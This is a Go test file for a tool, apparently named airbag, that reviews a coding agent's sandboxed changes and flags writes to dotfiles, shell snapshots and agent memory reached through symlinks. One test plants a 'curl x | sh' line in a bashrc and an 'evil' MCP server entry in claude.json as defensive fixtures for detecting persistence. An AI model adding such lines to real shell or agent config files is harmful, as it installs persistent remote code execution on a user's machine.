package review

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/getjump/airbag/internal/session"
)

func symlink(t *testing.T, target, link string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(link), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
}

// Dotfiles kept as links into ~/dotfiles: the agent's write through a
// link lands on its target, which is classified as the path it stands
// for.
func TestDotfileLinksAreClassified(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	writeCfg(t, filepath.Join(h, "dotfiles/bashrc"), "# rc\n")
	symlink(t, "dotfiles/bashrc", filepath.Join(h, ".bashrc"))
	writeCfg(t, filepath.Join(h, "dotfiles/claude/shell-snapshots/snap-1.sh"), "export PATH=/usr/bin\n")
	writeCfg(t, filepath.Join(h, "dotfiles/claude/projects/-x/memory/M.md"), "remember\n")
	symlink(t, "dotfiles/claude", filepath.Join(h, ".claude"))
	// One snapshot linked on its own, as a dotfiles manager may.
	writeCfg(t, filepath.Join(h, "dotfiles/snap-2.sh"), "export PATH=/usr/bin\n")
	symlink(t, "../../snap-2.sh", filepath.Join(h, "dotfiles/claude/shell-snapshots/snap-2.sh"))

	want := map[string]string{
		"dotfiles/bashrc":                           "persist",
		"dotfiles/claude/settings.json":             "persist",
		"dotfiles/claude/shell-snapshots/snap-1.sh": shellStateFlag,
		"dotfiles/snap-2.sh":                        shellStateFlag,
		"dotfiles/claude/projects/-x/memory/M.md":   "agent instructions",
		"dotfiles/notes.txt":                        "",
	}
	for rel := range want {
		writeCfg(t, filepath.Join(s.HomeUpper(), rel), "changed by the agent\n")
	}
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string][]string{}
	for _, c := range cs {
		got[c.Rel] = c.Flags
	}
	for rel, flag := range want {
		fl, ok := got[rel]
		if !ok {
			t.Errorf("%s: no change", rel)
			continue
		}
		if flag == "" {
			if len(withoutOutside(fl)) != 0 {
				t.Errorf("%s: flags %v, want none", rel, fl)
			}
		} else if !slices.Contains(fl, flag) {
			t.Errorf("%s: flags %v, want %q", rel, fl, flag)
		}
	}
}

func TestResolveInHome(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "home")
	writeCfg(t, filepath.Join(home, "dotfiles/rc"), "")
	symlink(t, "dotfiles/rc", filepath.Join(home, ".rc"))
	symlink(t, "dotfiles", filepath.Join(home, ".dir"))
	if err := os.MkdirAll(filepath.Join(root, "outside"), 0o700); err != nil {
		t.Fatal(err)
	}
	symlink(t, filepath.Join(root, "outside"), filepath.Join(home, ".out"))
	// $HOME itself reached through a link.
	link := filepath.Join(root, "homelink")
	symlink(t, "home", link)
	for _, h := range []string{home, link} {
		for rel, want := range map[string]string{
			".rc":           filepath.Join(h, "dotfiles/rc"),
			".dir/new/file": filepath.Join(h, "dotfiles/new/file"),
			".out/x":        "",
			"plain":         "",
			"dotfiles/rc":   "",
		} {
			got, ok := resolveInHome(h, rel)
			if want == "" && ok || want != "" && (!ok || got != want) {
				t.Errorf("home %s, %s: %q %v, want %q", h, rel, got, ok, want)
			}
		}
	}
}

// The workspace is the dotfiles repository the home links point into:
// the agent's edit of a file there is the linked dotfile.
func TestDotfilesRepoAsWorkspace(t *testing.T) {
	t.Setenv("AIRBAG_HOME", t.TempDir())
	home, ws := t.TempDir(), t.TempDir()
	writeCfg(t, filepath.Join(ws, "bashrc"), "# rc\n")
	writeCfg(t, filepath.Join(ws, "claude.json"), `{"numStartups":1}`)
	writeCfg(t, filepath.Join(ws, "notes.md"), "notes\n")
	symlink(t, filepath.Join(ws, "bashrc"), filepath.Join(home, ".bashrc"))
	symlink(t, filepath.Join(ws, "claude.json"), filepath.Join(home, ".claude.json"))
	s, err := session.Create(session.Meta{Workspace: ws, Home: home, OverHome: true})
	if err != nil {
		t.Fatal(err)
	}
	writeCfg(t, filepath.Join(s.WSUpper(), "bashrc"), "# rc\ncurl x | sh\n")
	writeCfg(t, filepath.Join(s.WSUpper(), "claude.json"), `{"numStartups":2,"mcpServers":{"x":{"command":"evil"}}}`)
	writeCfg(t, filepath.Join(s.WSUpper(), "notes.md"), "more notes\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]Change{}
	for _, c := range cs {
		got[c.Rel] = c
	}
	if !slices.Contains(got["bashrc"].Flags, "persist") {
		t.Errorf("bashrc: flags %v", got["bashrc"].Flags)
	}
	cj := got["claude.json"]
	if !slices.Contains(cj.Flags, "persist key(s): mcpServers") {
		t.Errorf("claude.json: flags %v", cj.Flags)
	}
	if d := diffOf(cj); strings.Contains(d, "evil") {
		t.Errorf("claude.json: diff printed a value: %q", d)
	}
	if len(got["notes.md"].Flags) != 0 {
		t.Errorf("notes.md: flags %v", got["notes.md"].Flags)
	}
}

// A link deep in a watched tree, one whose target does not exist yet, a
// linked memory directory, and a watched name linked to $HOME itself
// (which would stand for everything, so it stands for nothing).
func TestLinkedPathsBelowAndDangling(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	writeCfg(t, filepath.Join(h, "dotfiles/init.lua"), "-- x\n")
	symlink(t, filepath.Join(h, "dotfiles/init.lua"), filepath.Join(h, ".config/nvim/lua/plugin/init.lua"))
	symlink(t, "dotfiles/zshrc", filepath.Join(h, ".zshrc")) // dangling
	writeCfg(t, filepath.Join(h, "dotfiles/mem/M.md"), "remember\n")
	writeCfg(t, filepath.Join(h, ".claude/projects/-x/t.jsonl"), "{}\n")
	symlink(t, filepath.Join(h, "dotfiles/mem"), filepath.Join(h, ".claude/projects/-x/memory"))
	symlink(t, ".", filepath.Join(h, ".gemini"))
	want := map[string]string{
		"dotfiles/init.lua": "persist",
		"dotfiles/zshrc":    "persist",
		"dotfiles/mem/M.md": "agent instructions",
		"notes.txt":         "",
	}
	for rel := range want {
		writeCfg(t, filepath.Join(s.HomeUpper(), rel), "changed by the agent\n")
	}
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string][]string{}
	for _, c := range cs {
		got[c.Rel] = c.Flags
	}
	for rel, flag := range want {
		fl := got[rel]
		if flag == "" && len(withoutOutside(fl)) != 0 || flag != "" && !slices.Contains(fl, flag) {
			t.Errorf("%s: flags %v, want %q", rel, fl, flag)
		}
	}
}

// Working on a config's own repository: ~/.config/nvim links to the
// workspace root, so every change there is that config.
func TestWatchedDirLinkedToWorkspaceRoot(t *testing.T) {
	t.Setenv("AIRBAG_HOME", t.TempDir())
	home := t.TempDir()
	ws := filepath.Join(home, "nvimcfg")
	writeCfg(t, filepath.Join(ws, "init.lua"), "-- x\n")
	symlink(t, "../nvimcfg", filepath.Join(home, ".config/nvim"))
	s, err := session.Create(session.Meta{Workspace: ws, Home: home, OverHome: true})
	if err != nil {
		t.Fatal(err)
	}
	writeCfg(t, filepath.Join(s.WSUpper(), "init.lua"), "-- changed\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == "init.lua" && !slices.Contains(c.Flags, "persist") {
			t.Errorf("init.lua: flags %v", c.Flags)
		}
	}
}

// A path inside both roots is spelled under the most specific one, as
// the change there is found.
func TestUnderMostSpecificRoot(t *testing.T) {
	root := t.TempDir()
	real := filepath.Join(root, "real-home")
	if err := os.MkdirAll(filepath.Join(real, "ws"), 0o700); err != nil {
		t.Fatal(err)
	}
	home := filepath.Join(root, "home") // $HOME through a link
	symlink(t, "real-home", home)
	ws := filepath.Join(real, "ws") // the workspace's physical path
	got, ok := under(filepath.Join(real, "ws", "bashrc"), []string{home, ws})
	if !ok || got != filepath.Join(ws, "bashrc") {
		t.Errorf("under = %q %v, want the workspace's spelling", got, ok)
	}
}

// A relative dangling link below a linked directory is read from the
// directory the link really is in.
func TestDanglingLinkBelowLinkedDir(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	if err := os.MkdirAll(filepath.Join(h, "dotfiles/config"), 0o700); err != nil {
		t.Fatal(err)
	}
	symlink(t, "dotfiles/config", filepath.Join(h, ".config"))
	symlink(t, "../fish-src", filepath.Join(h, "dotfiles/config/fish")) // nothing there yet
	writeCfg(t, filepath.Join(s.HomeUpper(), "dotfiles/fish-src/config.fish"), "set -x PATH /tmp $PATH\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == "dotfiles/fish-src/config.fish" {
			if !slices.Contains(c.Flags, "persist") {
				t.Errorf("flags %v", c.Flags)
			}
			return
		}
	}
	t.Fatalf("no change in %+v", cs)
}
